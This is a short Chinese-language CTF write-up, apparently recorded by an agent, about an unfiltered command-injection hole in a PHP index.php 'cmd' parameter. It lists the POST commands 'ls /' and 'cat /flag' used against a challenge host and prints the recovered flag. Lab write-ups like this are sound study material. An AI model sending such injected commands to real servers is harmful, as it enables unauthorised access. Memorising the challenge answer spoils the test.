---
id: php-index-php-cmd-9278152c
title: PHP 命令注入 - index.php cmd 参数
target: http://49.232.142.230:15698
category: general
tags:
- command-injection
- ctf
- os-command-injection
- php
source: agent
created_at: '2026-07-14T02:36:04Z'
verified: true
evidence_reference: 9e951dcfdcdcbb19
evidence_tool: analyze_headers
evidence_fingerprint: 800fafd86bbaf30209e68d44
---

# PHP 命令注入 - index.php cmd 参数

## Summary

目标是一个 Apache/PHP 简单 Web 应用，通过 index.php 的 POST cmd 参数直接执行系统命令，无任何过滤。利用命令注入读取 /flag 文件获得 flag。

## Evidence

1. index.php 存在表单提交 cmd 参数到 POST /index.php 2. HTTP POST cmd=ls 返回目录列表（含 index.php）3. HTTP POST cmd=ls / 发现根目录下的 flag 文件 4. HTTP POST cmd=cat /flag 返回 flag: 0xGame{fl4g_1s_c0ntent}

## Resolution

1. 发现页面表单 action=index.php method=post, 参数 cmd 2. HTML 注释提示 flag 在 / 目录 3. POST cmd=ls / 发现 /flag 文件 4. POST cmd=cat /flag 获取 flag

## Failed Attempts

无需绕过过滤，直接命令注入即成功
